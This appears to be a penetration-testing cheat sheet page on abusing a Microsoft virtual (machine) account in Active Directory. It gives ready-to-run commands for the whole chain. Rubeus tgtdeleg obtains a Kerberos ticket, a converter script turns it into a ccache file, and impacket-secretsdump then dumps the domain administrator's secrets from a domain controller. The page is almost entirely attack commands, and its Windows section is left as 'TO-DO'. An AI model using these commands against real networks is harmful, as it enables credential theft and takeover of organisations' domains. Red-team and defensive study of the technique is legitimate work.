---
title: "Machine Account"
date: 2024-8-1
tags: ["machine account", "Microsoft virtual account", "active directory", "ad", "domain controller", "Windows", "rubeus", "kerberos"]
---

---
### Abuse #1: Microsoft virtual account

#### 1. Create a ticket from Microsoft virtual account

{{< tab set1 tab1 active >}}Windows{{< /tab >}}
{{< tabcontent set1 tab1 >}}

<div>

```powershell
.\rubeus.exe tgtdeleg /nowrap /ptt
```

</div>

{{< /tabcontent >}}

#### 2. Secrets Dump

{{< tab set2 tab1 active >}}Linux{{< /tab >}}
{{< tab set2 tab2 >}}Windows{{< /tab >}}
{{< tabcontent set2 tab1 >}}

#### 3. Convert kirbi to ccache

<div>

```bash
python3 rubeustoccache.py <BASE64_TICKET> secrets.kirbi secrets.ccache
```

</div>

#### 4. Secrets Dump

<div>

```bash
export KRB5CCNAME=secrets.ccache
```

```bash
sudo ntpdate -s <DC> && impacket-secretsdump -k -no-pass -just-dc-user administrator
```

</div>

<small>*Ref: [RubeusToCcache](https://github.com/SolomonSklash/RubeusToCcache)*</small>

{{< /tabcontent >}}
{{< tabcontent set2 tab2 >}}
TO-DO
{{< /tabcontent >}}

<br>